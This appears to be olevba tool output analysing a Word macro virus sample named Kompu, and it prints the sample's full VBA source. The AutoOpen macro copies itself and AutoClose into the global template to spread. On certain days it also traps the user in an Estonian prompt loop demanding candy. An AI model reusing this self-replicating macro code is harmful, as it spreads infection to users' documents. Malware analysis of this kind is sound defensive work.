olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu-4fe172306a5dfc27c7a1214cd14ef937d25e814f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu-4fe172306a5dfc27c7a1214cd14ef937d25e814f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kompu-4fe172306a5dfc27c7a1214cd14ef937d25e814f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim kuupaev
Dim Kompu$
'AutoOpen
'Makroviirus Kompu
On Error Resume Next
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoClose") + ":AutoClose", "Global:AutoClose"
WordBasic.FileSaveAll 1
kuupaev = WordBasic.Day(WordBasic.Now())
If kuupaev = 6 Or kuupaev = 8 Then
While Kompu$ <> "komm"
Kompu$ = WordBasic.[InputBox$]("Tahan kommi!", "Mul on paha tuju!")
Wend
WordBasic.PrintStatusBar "Nämm-Nämm-Nämm-Nämm-Amps-Amps-Klõmps-Kröök!"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

